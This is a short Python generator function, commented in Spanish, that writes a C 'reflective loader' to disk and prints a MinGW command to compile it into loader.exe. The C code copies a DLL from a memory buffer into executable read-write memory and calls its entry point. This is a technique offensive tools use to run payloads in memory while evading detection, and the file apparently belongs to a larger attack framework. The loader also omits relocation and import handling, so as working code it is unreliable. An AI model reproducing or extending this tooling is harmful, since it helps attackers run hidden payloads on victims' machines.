def generate_injector():
    print("\n[+] Generando plantilla Reflective Loader...")

    code = '''
// templates/reflective_loader.c
#include <windows.h>
#include <winnt.h>
#include <stdio.h>

// Cargar DLL desde memoria en reflectivo
void *reflective_load_library(void *dll_buffer) {
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)dll_buffer;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)((BYTE *)dll_buffer + dos->e_lfanew);

    SIZE_T image_size = nt->OptionalHeader.SizeOfImage;
    LPVOID remote = VirtualAlloc(NULL, image_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote) return NULL;

    // Copiar cabeceras
    memcpy(remote, dll_buffer, nt->OptionalHeader.SizeOfHeaders);

    // Copiar secciones
    IMAGE_SECTION_HEADER *sec = (IMAGE_SECTION_HEADER *)(nt + 1);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        void *src = (BYTE *)dll_buffer + sec[i].PointerToRawData;
        void *dst = (BYTE *)remote + sec[i].VirtualAddress;
        memcpy(dst, src, sec[i].SizeOfRawData);
    }

    // Ejecutar EntryPoint
    FARPROC entry = (FARPROC)((BYTE *)remote + nt->OptionalHeader.AddressOfEntryPoint);
    ((BOOL(WINAPI *)(HINSTANCE, DWORD, LPVOID))entry)((HINSTANCE)remote, DLL_PROCESS_ATTACH, NULL);

    return remote;
}
'''

    with open("templates/reflective_loader.c", "w") as f:
        f.write(code.strip())

    print("[+] Archivo generado: templates/reflective_loader.c")
    print("[+] Compilas: x86_64-w64-mingw32-gcc core/loader.c templates/reflective_loader.c -o loader.exe -O2 -s")

